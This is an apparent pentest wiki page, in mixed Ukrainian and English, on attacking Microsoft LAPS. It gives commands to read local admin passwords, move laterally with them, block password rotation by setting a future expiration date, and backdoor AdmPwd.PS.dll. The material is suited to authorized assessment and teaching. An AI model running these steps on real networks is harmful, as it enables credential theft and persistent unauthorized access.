# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Наразі під час assessment можна зустріти **2 LAPS flavour**:

- **Legacy Microsoft LAPS**: зберігає пароль локального адміністратора в **`ms-Mcs-AdmPwd`** та час завершення дії в **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (вбудований у Windows починаючи з оновлень April 2023): усе ще може emulates legacy mode, але в native mode використовує атрибути **`msLAPS-*`**, підтримує **password encryption**, **password history** і **DSRM password backup** для domain controllers.

LAPS призначений для керування **local administrator passwords**, роблячи їх **унікальними, randomized і frequently changed** на computers, приєднаних до domain. Якщо ви можете читати ці атрибути, зазвичай можна **pivot as the local admin** до ураженого host. У багатьох environments цікаво не лише прочитати сам пароль, а й з'ясувати, **кому було delegated access** до password attributes.

### Legacy Microsoft LAPS attributes

У computer objects домену реалізація legacy Microsoft LAPS призводить до додавання двох атрибутів:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS додає кілька нових атрибутів до computer objects:

- **`msLAPS-Password`**: clear-text password blob, що зберігається як JSON, коли encryption не увімкнено
- **`msLAPS-PasswordExpirationTime`**: запланований час завершення дії
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data для domain controllers
- **`msLAPS-CurrentPasswordVersion`**: version tracking на основі GUID, який використовується новішою rollback-detection logic (Windows Server 2025 forest schema)

Коли **`msLAPS-Password`** readable, значенням є JSON object, що містить account name, update time і clear-text password, наприклад:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Перевірте, чи активовано
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Доступ до пароля LAPS

Ви можете **завантажити raw LAPS policy** з `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, а потім використати **`Parse-PolFile`** з пакета [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), щоб перетворити цей файл у формат, зрозумілий для людини.

### Legacy Microsoft LAPS PowerShell cmdlets

Якщо legacy LAPS module встановлено, зазвичай доступні такі cmdlets:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

У Windows LAPS є новий модуль PowerShell і нові cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Кілька операційних деталей тут важливі:

- **`Get-LapsADPassword`** автоматично обробляє **legacy LAPS**, **clear-text Windows LAPS** та **encrypted Windows LAPS**.
- Якщо пароль **encrypted** і ви можете **read**, але не **decrypt** його, cmdlet повертає metadata, але не clear-text password.
- **Password history** доступна лише коли увімкнено **Windows LAPS encryption**.
- На domain controllers повернене джерело може бути **`EncryptedDSRMPassword`**.

### PowerView / LDAP

**PowerView** також можна використати, щоб з’ясувати, **хто може read the password і прочитати його**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
If **`msLAPS-Password`** readable, parse the returned JSON and extract **`p`** for the password and **`n`** for the managed local admin account name.

### Linux / remote tooling

Сучасні інструменти підтримують як legacy Microsoft LAPS, так і Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Примітки:

- Останні збірки **NetExec** підтримують **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** і **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** досі корисний для **legacy Microsoft LAPS** з Linux, але він працює лише з **`ms-Mcs-AdmPwd`**.
- Якщо середовище використовує **encrypted Windows LAPS**, простого LDAP read недостатньо; також потрібно бути **authorized decryptor** або використати підтримуваний шлях decrypt.

### Зловживання directory synchronization

Якщо у вас є права **directory synchronization** на рівні домену замість прямого read access до кожного об’єкта комп’ютера, LAPS все одно може бути цікавим.

Комбінацію **`DS-Replication-Get-Changes`** з **`DS-Replication-Get-Changes-In-Filtered-Set`** або **`DS-Replication-Get-Changes-All`** можна використати для синхронізації **confidential / RODC-filtered** атрибутів, таких як legacy **`ms-Mcs-AdmPwd`**. BloodHound моделює це як **`SyncLAPSPassword`**. Дивіться [DCSync](dcsync.md) для контексту щодо replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) спрощує enumeration LAPS за допомогою кількох функцій.\
Одна з них — parsing **`ExtendedRights`** для **всіх computer objects, у яких увімкнено LAPS.** Це показує **groups**, яким явно **delegated to read LAPS passwords**, і це часто users у protected groups.\
**Account**, який **joined a computer** до домену, отримує `All Extended Rights` над цим host, і це право дає **account** можливість **read passwords**. Enumeration може показати user account, який може read LAPS password на host. Це може допомогти нам **target specific AD users** who can read LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Дамп LAPS Passwords With NetExec / CrackMapExec

Якщо у вас немає інтерактивного PowerShell, ви можете зловживати цим привілеєм віддалено через LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
This dumps all the LAPS secret-и, які користувач може читати, дозволяючи вам рухатися lateral-но з іншим паролем локального адміністратора.

## Використання LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Підтримка LAPS

### Дата закінчення

Після отримання admin, можна **отримати паролі** і **запобігти** тому, щоб машина **оновлювала** свій **password**, **встановивши дату закінчення в майбутнє**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS використовує **`msLAPS-PasswordExpirationTime`** замість цього:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Пароль усе ще буде змінено, якщо **admin** використовує **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, або якщо ввімкнено **Do not allow password expiration time longer than required by policy**.

### Recovering historical passwords from AD backups

Коли увімкнено **Windows LAPS encryption + password history**, змонтовані AD backups можуть стати додатковим джерелом secrets. Якщо ви можете отримати доступ до змонтованого AD snapshot і використати **recovery mode**, ви можете запитувати старі збережені паролі без звернення до live DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Це здебільшого актуально під час **AD backup theft**, **offline forensics abuse** або **disaster-recovery media access**.

### Backdoor

Оригінальний вихідний код для legacy Microsoft LAPS можна знайти [here](https://github.com/GreyCorbel/admpwd), тому можливо додати backdoor у код (наприклад, всередині методу `Get-AdmPwdPassword` у `Main/AdmPwd.PS/Main.cs`), який якимось чином **exfiltrate нові паролі або зберігатиме їх десь**.

Потім скомпілюйте новий `AdmPwd.PS.dll` і завантажте його на машину в `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (і змініть час модифікації).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
